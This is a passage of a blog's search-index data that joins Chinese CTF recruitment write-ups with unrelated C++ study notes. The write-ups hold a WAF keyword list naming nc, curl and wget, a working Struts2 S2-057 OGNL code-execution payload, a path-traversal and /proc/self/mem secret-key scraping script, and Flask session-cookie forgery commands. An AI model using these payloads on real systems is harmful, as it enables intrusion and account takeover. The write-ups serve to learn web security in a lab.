app.config[\u0026#39;SECRET_KEY\u0026#39;] = \u0026#39;xxxxxxx\u0026#39; USERS = {} def waf_filter(data): malicious_keywords = [ \u0026#39;cat\u0026#39;, \u0026#39;ls\u0026#39;, \u0026#39;id\u0026#39;, \u0026#39;whoami\u0026#39;, \u0026#39;pwd\u0026#39;, \u0026#39;nc\u0026#39;, \u0026#39;curl\u0026#39;, \u0026#39;wget\u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;||\u0026#39;, \u0026#39;\u0026amp;\u0026amp;\u0026#39; ] for keyword in malicious_keywords: if keyword in data: return True return False # 登录逻辑 @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form.get(\u0026#39;username\u0026#39;) password = request.form.get(\u0026#39;password\u0026#39;) user_info = USERS.get(username) if user_info and user_info[\u0026#39;password\u0026#39;] == password: user_data = {\u0026#34;username\u0026#34;: username, \u0026#34;is_admin\u0026#34;: user_info[\u0026#39;is_admin\u0026#39;]} session[\u0026#39;user\u0026#39;] = base64.b64encode(json.dumps(user_data).encode(\u0026#39;utf-8\u0026#39;)).decode(\u0026#39;utf-8\u0026#39;) return redirect(url_for(\u0026#39;user_home\u0026#39;)) return render_template(\u0026#39;login.html\u0026#39;, message=\u0026#34;登录失败，用户名或密码错误。\u0026#34;) return render_template(\u0026#39;login.html\u0026#39;) ...... # ping 逻辑 @app.route(\u0026#39;/ping\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def ping_page(): if \u0026#39;user\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) try: user_data = json.loads(base64.b64decode(session[\u0026#39;user\u0026#39;]).decode(\u0026#39;utf-8\u0026#39;)) if not user_data.get(\u0026#39;is_admin\u0026#39;): return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;对不起，只有管理员才能使用这个功能。\u0026#34;) except Exception: return redirect(url_for(\u0026#39;logout\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: ip_base64 = request.form.get(\u0026#39;ip_base64\u0026#39;, \u0026#39;\u0026#39;) if not ip_base64: return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;请提供 IP 地址。\u0026#34;) try: decoded_ip = base64.b64decode(ip_base64.encode(\u0026#39;utf-8\u0026#39;)).decode(\u0026#39;utf-8\u0026#39;) if waf_filter(urllib.parse.unquote(ip_base64)): return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;WAF: 检测到恶意关键字，请求被阻止。\u0026#34;) if not re.match(r\u0026#39;^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$\u0026#39;, decoded_ip.split(\u0026#39;\\n\u0026#39;)[0]): return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;验证失败：IP 地址格式不正确\u0026#34;) if not all(0 \u0026lt;= int(part) \u0026lt; 256 for part in decoded_ip.split(\u0026#39;.\u0026#39;)): return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;验证失败：IP 地址格式不正确\u0026#34;) if not ipaddress.ip_address(decoded_ip): return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;验证失败：IP 地址格式不正确\u0026#34;) except Exception: return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;验证失败：无效的 Base64 编码或 IP 格式错误。\u0026#34;) command = f\u0026#34;echo \\\u0026#34;ping -c 1 $(echo \u0026#39;{ip_base64}\u0026#39; | base64 -d)\\\u0026#34; | sh\u0026#34; try: process = subprocess.run( command, shell=True, check=True, capture_output=True, text=True, timeout=5, executable=\u0026#34;/bin/sh\u0026#34; ) return render_template(\u0026#39;ping.html\u0026#39;, output=process.stdout) except subprocess.TimeoutExpired: return render_template(\u0026#39;ping.html\u0026#39;, message=\u0026#34;❌ Ping 操作超时，请重试或检查网络连接。\u0026#34;) except subprocess.CalledProcessError as e: return render_template(\u0026#39;ping.html\u0026#39;, message=f\u0026#34;命令执行失败：{e.stderr}\u0026#34;) except Exception as e: return render_template(\u0026#39;ping.html\u0026#39;, message=f\u0026#34;发生未知错误：{e}\u0026#34;) return render_template(\u0026#39;ping.html\u0026#39;) templates 各个 html 文件 尝试 1 2 D:\\software\\tools\\flask-session-cookie-manager-1.2.2\u0026gt;python flask_session_cookie_manager2.py encode -s \u0026#34;xxxxxxx\u0026#34; -t \u0026#34;{\u0026#39;username\u0026#39;:\u0026#39;admin\u0026#39;,\u0026#39;is_admin\u0026#39;:\u0026#39;true\u0026#39;}\u0026#34; eyJpc19hZG1pbiI6eyIgYiI6ImRISjFaUT09In0sInVzZXJuYW1lIjp7IiBiIjoiWVdSdGFXND0ifX0.aPCvLQ.2wnGTmxlNZK2w-jaIbz3fvYdfIs ","date":"2025-10-14T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-ipv4/","title":"御林招新题：ipv4"},{"content":"题干 目标一：云端之门的低语 （ Spring Cloud Gateway 3.1.0）\n“天穹”微服务 API 网关：这是公司最新潮的 API 网关，所有数据的流量中枢，看起来坚不可摧。然而，根据情报，这个版本的网关在处理路由请求时，似乎留下了一道不易察觉的缝隙。\n目标二：思想者的诡计 （ThinkPHP 5.0.23）\n“敏捷开发” PHP 门户:这是用一款广受欢迎的 PHP 框架搭建的门户网站，以其高效和灵活著称。然而，在处理 HTTP 请求的某个环节，框架对“请求方法”的理解出现了偏差。\n目标三：远古框架的咆哮 （ Struts 2.3.34）\n“化石”级企业管理平台：这是一个老旧的 Java 企业级应用，虽然年迈，但依然在核心业务线上运行。它的开发者在配置某个核心组件时，遵循了当时流行的“通配符”设计哲学，却忽略了这份“灵活”背后潜藏的巨大风险。\n解题过程 Spring Cloud Gateway 3.1.0 直接脚本过了\nThinkPHP 5.0.23 也是脚本\nStruts 2.3.34 这个脚本不知道怎么用\n于是尝试解题：\n打开网站发现是空白的，扫描工具扫到 /upload.action，进入 是 struts2，网上查询，发现 S2-057远程执行代码漏洞（CVE-2018-11776） 影响当前版本 参考 Struts2 S2-057远程执行代码漏洞（CVE-2018-11776）_apache struts 2 安全漏洞(cve-2018-11776)-CSDN博客\n区别在于上面靶场的网址是 /showcase\n漏洞判断 poc 1 2 ${ (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[\u0026#39;struts.valueStack\u0026#39;].context).(#cr=#ct[\u0026#39;com.opensymphony.xwork2.ActionContext.container\u0026#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec(\u0026#39;id\u0026#39;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))} 注意：poc 放到网址上，需要 url 编码。后续又发现，“ls /”这一字符串中空格需要编码，但是斜杠不需要编码！..也不需要编码\n最终 payload： 1 payload：/upload.action/$%7B%0A%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27cat%20/flag%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D/actionChain1.action ","date":"2025-10-14T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-%E6%A1%A3%E6%A1%88%E9%A6%86%E7%9A%84%E5%9B%9E%E5%93%8D/","title":"御林招新题：档案馆的回响"},{"content":"题目描述 御林娘图片_御林娘素材_御林娘高清图片_御林网图片下载_306万 御林娘 免版税图片、库存照片和图像 | Yulinsec\n御林娘小时候上网找素材做海报，意外发现了一个用python编写的盗版图片网站。她一顿操作猛如虎，行云流水地黑入网站获取管理员权限，狠狠报复了这个盗版网站。\n1 2 3 4 5 \u0026lt;h1\u0026gt;御林图库\u0026lt;/h1\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/download?file=pic1.png\u0026#34;\u0026gt;扣1送御林娘自拍\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;/download?file=pic2.png\u0026#34;\u0026gt;简约大气的御林娘图片-御林娘图片素材免费下载\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; 解题 思路 信息搜集：\n题目告知是 python 写的网站 页面给了链接，可能存在文件泄露！ 尝试下载文件，发现：/download?file=../app.py，于是得到源码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 from flask import Flask, request, session, render_template_string, abort, redirect, url_for, make_response, Response import ... app = Flask(__name__) def generate_secret_key(): prefix = \u0026#34;Yulin\u0026#34; suffix = \u0026#39;\u0026#39;.join(random.choices(string.ascii_letters + string.digits, k=16)) return prefix + suffix app.secret_key = generate_secret_key() flag = \u0026#34;\u0026#34; if os.path.isfile(\u0026#34;/flag\u0026#34;): with open(\u0026#34;/flag\u0026#34;, \u0026#34;r\u0026#34;) as f: flag = f.read().strip() os.remove(\u0026#34;/flag\u0026#34;) os.remove(\u0026#34;/start.sh\u0026#34;) else: flag = \u0026#34;[ ]\u0026#34; @app.route(\u0026#39;/\u0026#39;) def index(): if session.get(\u0026#39;is_admin\u0026#39;): return f\u0026#39;\u0026lt;h1\u0026gt;你好，Admin\u0026lt;/h1\u0026gt;\u0026lt;p\u0026gt;Flag: YulinSec{{{flag}}}\u0026lt;/p\u0026gt;\u0026#39; return ...... @app.route(\u0026#39;/download\u0026#39;) def download(): ...... allowed_proc_files = [\u0026#39;/proc/self/maps\u0026#39;, \u0026#39;/proc/self/mem\u0026#39;] if file_path in allowed_proc_files: pass else: ...... if file_path == \u0026#39;/proc/self/maps\u0026#39;: try: with open(file_path, \u0026#39;r\u0026#39;) as f: content = f.read() ... return response except Exception as e: ... if file_path == \u0026#39;/proc/self/mem\u0026#39;: if end \u0026lt;= start: end = start + 1048576 # 1MB def generate(): try: with open(file_path, \u0026#39;rb\u0026#39;) as f: f.seek(start) remaining = end - start while remaining \u0026gt; 0: chunk_size = min(1024 * 1024, remaining) # 每次最多读取1MB data = f.read(chunk_size) if not data: break yield data remaining -= len(data) except Exception as e: app.logger.error(f\u0026#34;Error reading memory: {str(e)}\u0026#34;) yield f\u0026#34;Error reading memory content from {start} to {end}\u0026#34;.encode() return Response( generate(), mimetype=\u0026#39;application/octet-stream\u0026#39;, headers={\u0026#39;Content-Disposition\u0026#39;: f\u0026#39;attachment; filename=memory_{start}_{end}.bin\u0026#39;} ) try: with open(file_path, \u0026#39;rb\u0026#39;) as f: content = f.read() except Exception as e: ... sanitized_content = re.sub( rb\u0026#39;flag\\{.*?\\}\u0026#39;, b\u0026#39;[ ]\u0026#39;, content, flags=re.IGNORECASE ) .... return response if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) 代码关键点：\n泄露了文件 /proc/self/maps 以及 /proc/self/mem\n限制了 mem 的读取，一次只能读 1 MB\n突破点在于取得 session 的 admin\n尝试 读取 maps：\n1 2 3 4 5 6 7 5e2267a76000-5e2267a77000 r--p 00000000 00:aa6 1871870 /usr/local/bin/python3.8 5e2267a77000-5e2267a78000 r-xp 00001000 00:aa6 1871870 /usr/local/bin/python3.8 5e2267a78000-5e2267a79000 r--p 00002000 00:aa6 1871870 /usr/local/bin/python3.8 5e2267a79000-5e2267a7a000 r--p 00002000 00:aa6 1871870 /usr/local/bin/python3.8 5e2267a7a000-5e2267a7b000 rw-p 00003000 00:aa6 1871870 /usr/local/bin/python3.8 ...... 权限：如 r--p、r-xp、rw-p 等，r 表示可读（read）、w 表示可写（write）、x 表示可执行（execute）、p 表示私有（private，即进程间不共享）。 由于数据段通常是可读可写的，所以考虑遍历读取 rw 的区域，编写脚本\n写脚本 不会写，问 AI\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 import requests import re def get_memory_regions(target): \u0026#34;\u0026#34;\u0026#34;获取可读写的匿名内存区域\u0026#34;\u0026#34;\u0026#34; try: response = requests.get(f\u0026#34;{target}/download?file=/proc/self/maps\u0026#34;, timeout=10) regions = [] for line in response.text.splitlines(): # 筛选包含Python字符串的内存区域特征 # 注意，由 rw-p 改为 rw,删去and if \u0026#39;rw\u0026#39; in line:# and (\u0026#39;anon_inode\u0026#39; in line or \u0026#39;[heap]\u0026#39; in line): addr_range = line.split()[0] start, end = addr_range.split(\u0026#39;-\u0026#39;) regions.append((int(start, 16), int(end, 16))) return regions except Exception as e: print(f\u0026#34;获取内存映射失败: {e}\u0026#34;) return [] def search_secret_key(target, regions): \u0026#34;\u0026#34;\u0026#34;在指定内存区域搜索secret_key\u0026#34;\u0026#34;\u0026#34; # 匹配模式：Yulin开头 + 16位字母数字 pattern = rb\u0026#39;Yulin[A-Za-z0-9]{16}\u0026#39; for start, end in regions: print(f\u0026#34;扫描内存区域: 0x{start:x} - 0x{end:x}\u0026#34;) # 分块读取（每次1MB，平衡速度和稳定性） chunk_size = 1 * 1024 * 1024 current = start while current \u0026lt; end: chunk_end = min(current + chunk_size, end) try: # 读取内存块 resp = requests.get( f\u0026#34;{target}/download?file=/proc/self/mem\u0026#34;, params={\u0026#39;start\u0026#39;: current, \u0026#39;end\u0026#39;: chunk_end}, timeout=15 ) # 搜索密钥 match = re.search(pattern, resp.content) if match: return match.group(0).decode() current = chunk_end print(f\u0026#34;已扫描: {int((current - start)/(end - start)*100)}%\u0026#34;, end=\u0026#39;\\r\u0026#39;) except Exception as e: print(f\u0026#34;\\n读取内存块失败(0x{current:x}): {e}\u0026#34;) current += chunk_size # 跳过错误块 return None def main(): target = \u0026#34;http://prob01-4a2b75818e1a60809324fca5d9adda1a.recruit.yulinsec.cn\u0026#34; print(f\u0026#34;目标地址: {target}\u0026#34;) # 获取内存区域 regions = get_memory_regions(target) if not regions: print(\u0026#34;未找到可扫描的内存区域\u0026#34;) return print(f\u0026#34;发现 {len(regions)} 个可扫描内存区域\u0026#34;) # 搜索secret_key secret_key = search_secret_key(target, regions) if secret_key: print(f\u0026#34;\\n找到secret_key: {secret_key}\u0026#34;) else: print(\u0026#34;\\n未找到secret_key，请尝试重新运行\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() 主要是 request 库还是不熟，还有 re 正则匹配、字符串处理。\n先这样吧。\n得到 secret_key：xxxx\n漏洞利用 得到了 key 以后，抓包发现文件头中并不包含 Cookie！\n考虑自己构造，发送 于是使用 flask-session-cookie-manager 来构造\n还顺便配置了 py2、py3\n1 2 3 D:\\software\\tools\\flask-session-cookie-manager-1.2.2\u0026gt;python .\\flask_session_cookie_manager2.py encode -s \u0026#34;Yulin9IlwFlKE3K6ubjNn\u0026#34; -t \u0026#34;{\u0026#39;is_admin\u0026#39;:\u0026#39;true\u0026#39;}\u0026#34; eyJpc19hZG1pbiI6eyIgYiI6ImRISjFaUT09In19.aO5EQg.kmSLHAE42MX1z895x02HEdD8zqg 这里要注意的是 true 也要用分号包围……\n放到 bp，完成！\n","date":"2025-10-14T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-%E5%BE%A1%E5%9B%BE%E7%BD%91/","title":"御林招新题：御图网"},{"content":"内存分区模型 程序运行前 编译后生成 exe 可执行程序，分为两个区域\n代码区：\n存放CPU执行的机器指令 代码区是共享的，共享的目的是对于频繁被执行的程序，只需要在内存中有一份代码即可 代码区是只读的，使其只读的原因是防止程序意外地修改了它的指令 全局区：\n全局变量和静态变量存放在此 局部变量（即使用 const 修饰）不在全局区中 全局区还包含了常量区，字符串常量和其他常量也存放在此 const 修饰的全局常量、字符串常量 该区域的数据在程序结束后由操作系统释放 程序运行后 栈区：\n由编译器自动分配释放，存放函数的参数值，局部变量等 注意事项：不要返回局部变量的地址，栈区开辟的数据由编译器自动释放（如函数的形参、局部变量） 堆区：\n由程序员分配释放，若程序员不释放，程序结束时由操作系统回收 在 C++ 中主要利用 new 在堆区开辟内存 1 2 3 4 5 6 7 int * func () { //利用new关键字可以将数据开辟到堆区 //指针本质也是局部变量，放在栈上，指针保存的数据是放在堆区 int * p=newint(10) ; return p; } new 操作符 C++中利用new操作符在堆区开辟数据\n堆区开辟的数据，由程序员手动开辟，手动释放，释放利用操作符delete\ndelete 对应指针 利用new创建的数据，会返回该数据对应的类型的指针\n1 2 3 4 // 创建数组 int* a = new int(length); //释放数组的时候要加[]才可以,指明一段内存空间 delete[] arr; 引用 给变量起别名\n变量的含义：用于指代，操作某块内存 1 2 // 语法：数据类型\u0026amp;别名=原名 int \u0026amp;b = a; 注意事项 引用必须初始化 初始化后不可再改变 引用做函数参数 作用：函数传参时，可以利用引用的技术让形参修饰实参\n优点：可以简化指针修改实参\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 //1.值传递 void mySwap01（int a,int b）{ int temp=a; a = b b = temp; } //2.地址传递 void mySwapθ2（int *a,int *b）{ int temp*a; *b; *b=temp; } //3.引用传递,别名和本名可以相同 void mySwap03（int \u0026amp;a，int \u0026amp;b）{ int temp =a; a = b b = temp; } 引用做返回值 注意：不要返回局部变量引用\n用法：函数调用作为左值\n1 2 3 4 5 6 7 //2、函数的调用可以作为左值 int\u0026amp; test02( { staticinta=10;//静态变量，存放在全局区，全局区上的数据在程序结束后系统释放 return a; } test02() = 1000 // 支持 引用的本质 本质是指针常量，由编译器转换为指针\n1 2 3 //自动转换为 int*constref=\u0026amp;a；指针常量是指针指向不可改，也说明为什么引用不可更改 int\u0026amp; ref=a; ref = 20；//内部发现 ref 是引用，自动帮我们转换为：*ref=20； 常量引用 1 2 3 4 5 //常量引用 //使用场景：用来修饰形参，防止误操作 //int\u0026amp; a = 10; 这行错误，非法空间 //加上const之后编译器将代码修改int temp = 10;const int \u0026amp;rettemp; const int\u0026amp; ref=10；//引用必须引一块合法的内存空间 函数 默认参数 C++中，函数的形参列表中的形参是可以有默认值的\n1 2 3 int func(int a,int b = 20 ， int c = 30){ return a + b + c; } 如果某个位置已经有了默认参数，那么从这个位置往后，从左到右都必须有默认值 如果函数声明有默认参数，函数实现就不能有默认参数 占位参数 1 2 3 4 //函数占位参数，占位参数也可以有默认参数 void func（int a，int）{ cout\u0026lt;\u0026lt;“thisisfunc\u0026#34;\u0026lt;\u0026lt;endl; } 重载 作用：函数名可以相同，提高复用性\n函数重载满足条件：\n同一个作用域下 函数名称相同 函数参数类型不同或者个数不同或者顺序不同 返回值不同不可以作为条件 注意 引用作为重载条件\n以 const 为标志的区分，是否可写 数重载碰到函数默认参数\n出现二义性，报错 类和对象 封装 意义：\n属性和行为作为一个整体，表现生活中的事物 属性和行为加以权限控制 语法：class 类名 { 访问权限：属性/行为 }；\n1 2 3 4 5 6 7 8 9 10 class circle { public: int r; double calculateC(){ return 2 * PI * r; } } Circle c1; // 实例化 c1.r = 10; // 给属性赋值 类中的属性和行为统一称为成员\n成员属性 \u0026ndash;\u0026gt; 成员变量 成员函数 \u0026ndash;\u0026gt; 成员方法 访问权限 public：类内可以访问，类外可以访问\nprotected：类内可以访问，类外不可以访问，继承类可访问\nprivate：类内可以访问，类外不可以访问。\nStruct 和 Class 唯一的区别就在于默认的访问权限不同\nstruct 默认权限为公共 class 默认权限为私有 成员属性私有化 优点：\n所有成员属性设置为私有，可以自己控制读写权限 对于写权限，我们可以检测数据的有效性 用 set 、get 方法控制权限、操作\n对象的初始化和清理 构造函数和析构函数 构造函数：主要作用在于创建对象时为对象的成员属性赋值，构造函数由编译器自动调用，无须手动调用。\n没有返回值也不写void 函数名称与类名相同 类名(){} 构造函数可以有参数，因此可以发生重载 程序在调用对象时候会自动调用构造，无须手动调用，而且只会调用一次 析构函数：主要作用在于对象销毁前系统自动调用，执行一些清理工作。\n没有返回值也不写void 函数名称与类名相同，在名称前加上符号 ~ 析构函数不可以有参数，因此不可以发生重载 程序在对象销毁前会自动调用析构，无须手动调用，而且只会调用一次 构造函数分类与调用 分类：\n按参数分为：有参构造和无参构造 使用默认无参构造时，不要加括号，否则会认为是函数声明 按类型分为：普通构造和拷贝构造 不要用拷贝构造函数初始化匿名对象，编译器会认为 Person(p3) === Person p3 1 2 3 4 //拷贝构造函数 Person(const Person\u0026amp; p）{ age =p.age; } 调用方式：括号法，显式法，隐式转换法\n1 2 3 4 //1、括号法 Person p1；//默认构造函数调用 Person p2(10)；//有参构造函数 Person p(p2)；//拷贝构造函数 1 2 3 4 5 //2、显示法 Person p1; //不能加括号 Person p2=Person(10)；//有参构造 Person p3=Person（p2）；//拷贝构造 Person(10)；//匿名对象特点：当前行执行结束后，系统会立即回收掉匿名对象 1 2 3 //3、隐式转换法 Person p4 = 10;//相当于写了Person p4 =Person(10);有参构造 Person p5 = p4;// 拷贝构造 拷贝构造函数的调用时机 使用一个已经创建完毕的对象来初始化一个新对象 传递的方式给函数参数传值 值方式返回局部对象 在函数内部创建的对象被返回时，会创建一个新的对象返回 拷贝构造函数的调用规则 默认情况下，C++编译器至少给一个类添加3个函数：\n默认构造函数（无参，函数体为空） 默认析构函数(无参，函数体为空) 认拷贝构造函数，对属性进行值拷贝 定义有参构造函数，C++ 不再提供默认无参构造，但是会提供默认拷贝构造\n定义拷贝构造函数，C++ 不会再提供其他构造函数\n深浅拷贝 浅：简单的赋值拷贝\n默认提供的是浅拷贝 深：在堆内存重新创建一块内存，进行拷贝\n涉及到申请堆区时，需要深拷贝 初始化列表 1 2 3 4 5 //初始化列表初始化属性 Person(int a, int b,int c) :m_A(a),m_B(b), m_C(c) { ... } 类作为类成员 当类有嵌套时，会先构造内部对象，析构顺序与构造相反\n静态成员 静态成员变量：\n所有对象共享同一份数据 在编译阶段分配内存 类内声明，类外初始化 静态成员函数：\n所有对象共享同一个函数 只能访问静态成员变量 因为调用函数时，无法定位非静态成员变量（属于特定对象） 可以通过对象，也可以直接通过类名访问，有访问权限\n内存模型和 this 指针 内存：\n类内的成员变量和成员函数分开存储\n只有非静态成员变量才属于类的对象上\nthis 指针：\n指向被调用的成员函数所属的对象，隐含在每一个非静态成员函数内 当形参和成员变量同名时，可用this指针来区分 this -\u0026gt; name 在类的非静态成员函数中返回对象本身，可使用 return *this 实现链式编程 1 2 3 4 5 6 Person\u0026amp; PersonAddAge(Person \u0026amp;p) { this-\u0026gt;age += p.age; //this指向p2的指针，而*this指向的就是p2这个对象本体 return *this; } 注意返回 Person**\u0026amp;**，值返回会调用拷贝函数创建一个新的对象\n空指针访问成员函数 1 2 3 Person * p = NULL; p-\u0026gt;showClassName (); // 只要所调用的函数中没有使用到 this 即可(包含隐含的 this，用于访问属性) const 修饰成员函数 常函数：\n成员函数后加const后我们称为这个函数为常函数\n常函数内不可以修改成员属性\n成员属性声明时加关键字mutable后，则在常函数中也可以修改\n1 2 3 4 5 6 //this指针的本质是指针常量指针的指向是不可以修改的 const Person * const this; // 设置指针指向的值也无法修改 void showPersonO() const{ this-\u0026gt;m_A = 100; } //this=NULL； //this指针不可以修改指针的指向 常对象：\n声明对象前加const称该对象为常对象 对象只能调用常函数 友元 使一个函数或者类访问另一个类中私有成员，关键字friend\n三种实现：\n局函数做友元 类做友元 成员函数做友元 friend void clazz::method(); 在类中声明 friend，被声明的可以访问本类的私有属性\n运算符重载 定义自定义类型的运算方式\n成员函数重载：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 //1、成员函数重载+号，本质调用：Person p3 =pl.operator+(p2); Person operator+(Person \u0026amp;p) { Person temp; temp.m_A=this-\u0026gt;m_A +p.m_A； temp.m_B =Ithis-\u0026gt;m_B +p.m_B; return temp; } //2、全局函数重载+号,本质调用：Person p3 = operator+(pl,p2); Person operator+(Person \u0026amp;pl,Person \u0026amp;p2) { Person temp; temp.m_A =pl.m_A +p2.m_A; temp.m_B=pl.m_B+p2.m_B; return temp; } 左移 只能通过全局函数重载\n1 2 3 4 5 6 //只能利用全局函数重载左移运算符 void operator\u0026lt;\u0026lt;(ostream \u0026amp;cout,Person \u0026amp;p)//本质: operate\u0026lt;\u0026lt; (cout,p) { cout \u0026lt;\u0026lt; p.name; return cout; } 递增 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 //重载前置++运算符返回引用为了一直对一个数据进行递增操作 MyInteger\u0026amp; operator++() { //先进行++运算 m_Num++; //再将自身做返回 return *this; } //重载后置++运算符 //void operator++(int) int代表占位参数，可以用于区分前置和后置递增 MyInteger operator++(int) { //先记录当时结果 MyInteger temp = *this; //后递增 m_Num++; 7/最后将记录结果做返回 return temp; } 赋值 默认实现为浅拷贝，p1 = p2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // 重载赋值运算符 Person\u0026amp; operator=(Person \u0026amp;p) { if (m_Age != NULL) { delete m_Age; m_Age = NULL; } // 编译器提供的代码是浅拷贝 // m_Age = p.m_Age; // 提供深拷贝 解决浅拷贝的问题 m_Age = new int(*p.m_Age); // 返回自身 return *this; } 注意：返回引用，可以操作自身；返回值，会拷贝出一个对象。目的是为了实现连等\n关系 1 2 3 4 5 6 7 8 9 10 11 bool operator==(Person \u0026amp;p) { if (this-\u0026gt;m_Name == p.m_Name \u0026amp;\u0026amp; this-\u0026gt;m_Age == p.m_Age) { return true; } else { return false; } } 函数调用 （） 仿函数\n非常灵活 1 2 3 4 5 //重载函数调用运算符 void operator() (string test) { cout\u0026lt;\u0026lt; test \u0026lt;\u0026lt; endl; } 继承 下级别的成员除了拥有上一级的共性，还有自己的特性，抽取出父、子\n用于减少重复代码 1 2 3 4 class son : public father { ... } 继承方式 向下压级，私有被隐藏，但还是会继承\n继承的对象模型 父类中所有非静态成员属性都会被子类继承下去\n构造、析构顺序 子类继承父类后，当创建子类对象，也会调用父类的构造函数\n先有父，后有子；析构相反 同名成员处理 父类加作用域 s.base::func(); 只要子类有同名，父类函数全都被隐藏（重载也不行） 子类直接访问 同名静态成员 静态成员和非静态成员出现同名，处理方式一致\n多继承 class son: type fa1,type fa2\n不建议，父类命名可能重复\n菱形继承 一出二，二合一\n孙类继承了两份父类的相同数据，产生冗余\n利用虚继承解决菱形继承\n1 2 3 4 5 6 7 8 9 //利用虚继承解决菱形继承的问题 //继承之前加上关键字virtual变为虚继承 //Anima1类称为虚基类 [//羊类 class Sheep0:virtual public Animal{}： //驼类 class Tuo :virtual public Animal{}; //羊驼类 class SheepTuo :public ISheep, public Tuo{}; 多态 基本概念 多态分为两类\n静态多态：函数重载和运算符重载属于静态多态，复用函数名 动态多态：派生类和虚函数实现运行时多态 有派生类时，动态绑定子类重写的虚函数（父类指针指向子类对象） 静态多态和动态多态区别：\n静态多态的函数地址早绑定－编译阶段确定函数地址 动态多态的函数地址晚绑定－运行阶段确定函数地址 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 class Animal { public: //Speak函数就是虚函数 //函数前面加上virtual关键字，变成虚函数，那么编译器在编译的时候就不能确定函数调用了。 virtual void speak() { cout \u0026lt;\u0026lt; \u0026#34;动物在说话\u0026#34; \u0026lt;\u0026lt; endl; } }; class Cat :public Animal { public: void speak() { cout \u0026lt;\u0026lt; \u0026#34;小猫在说话\u0026#34; \u0026lt;\u0026lt; endl; } }; 原理：\n子类重写父类虚函数时：子类中的虚函数表内部会替换成子类的虚函数地址 优点：\n满足“开闭原则” 扩展对外开放，修改对外关闭\n组织结构清晰，可读性强 可维护性强 纯虚函数和抽象类 virtual 返回值类型 函数名（参数列表）= θ；\n当类中有了纯虚函数，这个类也称为抽象类\n抽象类无法实例化 子类必须重写父类的纯虚函数，否则子类也是抽象类 虚析构与纯虚析构 共性：\n解决父类指针释放子类对象 原因：父类指针指向子类对象，delete 的时候只调用父类的析构函数 都需要有具体的函数实现 差异：\n如果是纯虚析构，该类属于抽象类，无法实例化对象 虚析构函数需要被实现 若堆中没有数据，可以不写\n文件操作 文本文件 文件以 ASCII 码存储\n操作文件的三大类：\nofstream：写操作 ifstream：读操作 fstream：读写操作 写文件 步骤：\n包含头文件 #include \u0026lt;fstream\u0026gt; 创建流对象 ofstream ofs; 打开文件 ofs.open(\u0026quot;文件路径\u0026quot;,打开方式); 写数据 ofs\u0026lt;\u0026lt;\u0026quot;写入的数据\u0026quot;; 关闭文件ofs.close() 二进制 ios::binary\n","date":"2025-10-13T00:00:00Z","image":"https://raw.githubusercontent.com/calendar0917/images/master/20251013082109789.png","permalink":"https://calendar0917.github.io/posts/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0-c++%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/","title":"C++ 核心编程"},{"content":"Mybatis 介绍 